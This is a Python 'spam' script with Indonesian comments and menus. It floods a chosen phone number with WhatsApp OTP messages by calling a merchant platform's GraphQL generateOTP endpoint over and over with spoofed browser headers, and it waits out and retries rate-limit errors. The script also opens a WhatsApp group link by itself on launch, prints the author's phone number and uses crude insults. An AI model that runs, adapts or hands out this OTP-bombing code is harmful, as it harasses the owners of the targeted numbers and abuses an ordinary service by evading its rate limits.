# Simpel Spam Script By MR_DARK
# Decode Wajib Subs >_<
import os,sys,time,requests,json,random,re,gzip,itertools,threading
from requests import post
from requests import get
r = requests.Session()
def dark_bypass_limit(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'   \033[1;37m\033[31m•\033[1;37m  Bypass Limit (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1
def subrek_mr_dark():
        time.sleep(1)
        dark_n = input("   \033[1;37m[\033[31m•\033[1;37m] No Target: \033[36m+62")
        jumlah = int(input("   \033[1;37m[\033[31m•\033[1;37m] Jumlah: \033[36m"))
        print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
        dark_no = "+62"+dark_n
        dark={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":dark_no,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
        mr_telkom={
        'content-length':'50',
        'accept':'application/json, text/plain, /',
        'sec-ch-ua-mobile':'?0',
        'save-data':'on',
        'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
        'content-type':'application/json',
        'sec-fetch-site':'same-site',
        'sec-fetch-mode':'cors',
        'sec-fetch-dest':'empty',
        'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        for i in range(int(jumlah)):
            darko=requests.post('https://api.tokko.io/graphql',headers=mr_telkom,json=dark).text
            b = json.loads(darko)
            if 'errors' in b:
                 print (f"   \033[31m✘  \033[0m\033[0m{dark_no} \033[0mTelah Mencapai Limit.")
                 dark_bypass_limit(00, 5)
            else:
                 print ("   \033[32m✔ \033[97m Berhasil spam                   ")
                 time.sleep(10)
        dark_loop = input("   \033[31m• \033[97mdone ingin ngocok lagi? [y/n] \033[1;37m\033[31m➤ \033[1;33m")
        if dark_loop == "y":
                time.sleep(1)
                dark_ban()
        elif dark_loop == "n":
                time.sleep(1)
                print ("   \033[32m✔ \033[0m Goodbye Kontol :)")
        else:
                time.slee(1)
def dark_ban():
        os.system("clear")
        print ("\x1b[93m╲┏━┳━━━━━━━━┓╲╲            \x1b[96m[\x1b[91m•\x1b[96m]\x1b[91mSpam-WA")
        print ("\x1b[93m╲┃◯┃╭┻┻╮╭┻┻╮┃╲╲  \x1b[96m===============================")
        print ("\x1b[93m╲┃╮┃┃╭╮┃┃╭╮┃┃╲╲  \x1b[96m[\x1b[91m•\x1b[96m]Author \x1b[91m: \x1b[96mRIDHO XD")
        print ("\x1b[93m╲┃╯┃┗┻┻┛┗┻┻┻┻╮╲  \x1b[96m[\x1b[91m•\x1b[96m]Facebook \x1b[91m: \x1b[96mRidho Wibu")
        print ("\x1b[93m╲┃◯┃╭╮╰╯┏━━━┳╯╲  \x1b[96m[\x1b[91m•\x1b[96m]Whatsapp \x1b[91m: \x1b[96m+628385880430")
        print ("\x1b[93m╲┃╭┃╰┏┳┳┳┳┓◯┃╲╲  \x1b[96m===============================")
        print ("")
    #print ("    \033[1;37m\033[31m>\033[1;37m YouTube\033[31m:\033[1;37m\033[1;37m tod ")
    #print ("    \033[1;37m\033[31m>\033[1;37m Github\033[31m:\033[1;37m\033[1;37m tod ")
        print ("")
        print ("   \033[1;37m\033[31m>\033[1;37m Status Otp\033[31m:\033[1;37m\033[1;32m OK")
        print ("   \033[1;37m\033[31m>\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m0")
        print ("")
        print ("    \033[1;37m\033[31m\033[1;33m1\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Whatsapp Unlimited\033[31m(\033[32mWhatsApp\033[31m) ")
        print ("    \033[1;37m\033[31m\033[1;33m2\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mJoin Grup \033[31m(\033[32mWhatsapp\033[31m) ")
        print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mKeluar Dari Script \033[31m(\033[0mExit\033[31m) ")
        print ("")
        dark_quest = input("   \033[1;37m\033[31m➤ \033[1;33m")
        if dark_quest == "1":
             subrek_mr_dark()
        elif dark_quest == "2":
             os.system("xdg-open https://chat.whatsapp.com/GIxCF1qCVz25CXJCIaa2L6")
             print ("   \033[32m✔ \033[0m Thanks :)")
             time.sleep(10)
             dark_ban()
        elif dark_quest == "3":
             print ("   \033[32m✔ \033[0m Goodbye kontol :)")
        else:
             print (f"   \033[31m✖ \033[97mInput: \033[31m{dark_quest} \033[97mDiluar Dari Script!!")
             time.sleep(3)
             dark_ban()
def dark_start():
        os.system("clear")
        print ("\033[36m ENTOD \033[1;37mEMAK LU \033[36mcuy")
        time.sleep(2)
        #os.system("xdg-open https://www.youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A")
        time.sleep(4)
        print ("\033[36m Join \033[1;37mGRUP GW \033[36mcuy")
        time.sleep(2)
        os.system("xdg-open https://chat.whatsapp.com/GIxCF1qCVz25CXJCIaa2L6")
        print ("")
        time.sleep(2)
def dark_hengker():
        dark_start()
        dark_ban()
done = False
def dark_club():
    for c in itertools.cycle(['\033[1;37m[\033[31m•\033[1;37m] Memulai ngocok...', '\033[1;37m[\033[31m•\033[1;37m] mEmulai ngocok.. ', '\033[1;37m[\033[31m•\033[1;37m] meMulai ngocok.  ', '\033[1;37m[\033[31m•\033[1;37m] memUlai ngocok.. ', '\033[1;37m[\033[31m•\033[1;37m] memuLai ngocok...', '\033[1;37m[\033[31m•\033[1;37m] memulAi ngocok.. ', '\033[1;37m[\033[31m•\033[1;37m] memulaI ngocok.  ', '\033[1;37m[\033[31m•\033[1;37m] memulai Ngocok.. ', '\033[1;37m[\033[31m•\033[1;37m] memulai dArk scri...', '\033[1;37m[\033[31m•\033[1;37m] memulai ngOcok.. ', '\033[1;37m[\033[31m•\033[1;37m] memulai ngoCok.  ', '\033[1;37m[\033[31m•\033[1;37m] memulai ngocOk.. ', '\033[1;37m[\033[31m•\033[1;37m] memulai ngocoK...', '\033[1;37m[\033[31m•\033[1;37m] memulai NgOcOk.. ', '\033[1;37m[\033[31m•\033[1;37m] memulai nGoCok.  ', '\033[1;37m[\033[31m•\033[1;37m] memulai NgoCoK.. ', '\033[1;37m[\033[31m•\033[1;37m] memulai ngocoK...']):
        if done:
            break
        sys.stdout.write('\r'+c)
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r              ')
    print ("                                                ")
    dark_hengker()
t = threading.Thread(target=dark_club)
t.start()

time.sleep(4.60)
done = True